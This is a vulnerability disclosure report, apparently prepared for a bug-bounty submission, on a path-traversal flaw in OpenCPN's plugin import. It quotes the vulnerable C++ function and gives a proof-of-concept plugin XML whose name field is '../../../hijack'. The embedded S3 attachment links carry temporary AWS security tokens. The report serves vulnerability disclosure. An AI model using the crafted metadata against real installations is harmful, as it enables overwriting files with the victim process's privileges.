---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-12 13:49
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X4OUJRLY%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T044943Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJIMEYCIQCAsz9Fee%2FgWAD%2FTbyCA5T%2B6J1ymCf5KeVPeinV0CufAwIhANV5NpVnpoBBrODEhkRwA4zvi5o934dEXZPPDVhlUO0YKv8DCA0QABoMNjM3NDIzMTgzODA1IgxYmwA09bCkY%2FZGDkwq3APruSN8gdgxfcGwtqj%2B3thJEU%2BvLKfbNY3hlUUTkQuEUsXAZj5yzoJjLIP6jNSctLrGpF0sadnFcaf%2FeDGHqyS%2FQRAsB6okX7ApKc2PIgvjal55zijdy11wYYfzW2V4VPInEL%2BEMu4nUg1wIL9d60Mef1v39edId8OYzXbrV2ar7hXOJykSalEJWILxLvvbAWu3dh0G87NfMH8OJJ0mWKfGr%2BZ33of7V4tcPryrFMmNIvDURAD9kCHNFGBcHHmNKAL21TSgfxaBw0%2B3YCTnaa151aMaplztk9Y1i8ACYUi8dboyJLiroCY2EaiUhy%2BEHOyzDfqI6ekncabv%2FL9XcXjlgh4TfUpTNRcAz0wb3nO53rcd5CZ2SP2428Xb7NBVFxXfjrRCGwWt2jzJuAYJBMXwpi0yj41tJOaRm124w%2Fgfvlf8pZpDEKCsRAKzLlnqzoWHzxsaZ9t3x1kd25he9P2ya32uxKOdv293WNs2VuXmD2l7O2HLO8kc7zEdNHARQ%2BG%2BQnM5htGSrNmejuxG4wthKygLikNNQUNHLZz4yACbP4dLOTn%2BIvfTXoi5Pg%2BzZnJ4K8qUzhQAuWw0nT7vMxsvgRsu8jZEY%2FQ6wpeO4HS3o8XI9eG2%2BADtISXTKTC1%2Bq3RBjqkARaUEZF0cSedBf4fdEsXRUu6f5f4Tdp2%2BORbN74zInp5LNdwL%2F0wXQC30VsXn4Ga%2FzI6Nbkwtfkr1x2BKE8ZwqD4lgyyY3k7vl90K5xgOWVDLvNQqmEQ1Z%2FFt%2FsaKbOQI32aC21GhdgnbiBxkvkh7Ydpvl7eEtjjif2hGxnRXGzw9vOmab6iKJ2TAIaFdQ7KTz7dXyXJNVGHoKKWo%2F%2FrbQM%2FNmYB&X-Amz-Signature=302ee9e09976928889bf3b07db2824bf225580077a6aba9890f689143529da7b&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466X4OUJRLY%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T044943Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJIMEYCIQCAsz9Fee%2FgWAD%2FTbyCA5T%2B6J1ymCf5KeVPeinV0CufAwIhANV5NpVnpoBBrODEhkRwA4zvi5o934dEXZPPDVhlUO0YKv8DCA0QABoMNjM3NDIzMTgzODA1IgxYmwA09bCkY%2FZGDkwq3APruSN8gdgxfcGwtqj%2B3thJEU%2BvLKfbNY3hlUUTkQuEUsXAZj5yzoJjLIP6jNSctLrGpF0sadnFcaf%2FeDGHqyS%2FQRAsB6okX7ApKc2PIgvjal55zijdy11wYYfzW2V4VPInEL%2BEMu4nUg1wIL9d60Mef1v39edId8OYzXbrV2ar7hXOJykSalEJWILxLvvbAWu3dh0G87NfMH8OJJ0mWKfGr%2BZ33of7V4tcPryrFMmNIvDURAD9kCHNFGBcHHmNKAL21TSgfxaBw0%2B3YCTnaa151aMaplztk9Y1i8ACYUi8dboyJLiroCY2EaiUhy%2BEHOyzDfqI6ekncabv%2FL9XcXjlgh4TfUpTNRcAz0wb3nO53rcd5CZ2SP2428Xb7NBVFxXfjrRCGwWt2jzJuAYJBMXwpi0yj41tJOaRm124w%2Fgfvlf8pZpDEKCsRAKzLlnqzoWHzxsaZ9t3x1kd25he9P2ya32uxKOdv293WNs2VuXmD2l7O2HLO8kc7zEdNHARQ%2BG%2BQnM5htGSrNmejuxG4wthKygLikNNQUNHLZz4yACbP4dLOTn%2BIvfTXoi5Pg%2BzZnJ4K8qUzhQAuWw0nT7vMxsvgRsu8jZEY%2FQ6wpeO4HS3o8XI9eG2%2BADtISXTKTC1%2Bq3RBjqkARaUEZF0cSedBf4fdEsXRUu6f5f4Tdp2%2BORbN74zInp5LNdwL%2F0wXQC30VsXn4Ga%2FzI6Nbkwtfkr1x2BKE8ZwqD4lgyyY3k7vl90K5xgOWVDLvNQqmEQ1Z%2FFt%2FsaKbOQI32aC21GhdgnbiBxkvkh7Ydpvl7eEtjjif2hGxnRXGzw9vOmab6iKJ2TAIaFdQ7KTz7dXyXJNVGHoKKWo%2F%2FrbQM%2FNmYB&X-Amz-Signature=c2cba4ed3d3fdf7663f93709c6284faf1f766348daf12e5ba94b925f38dd0de0&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
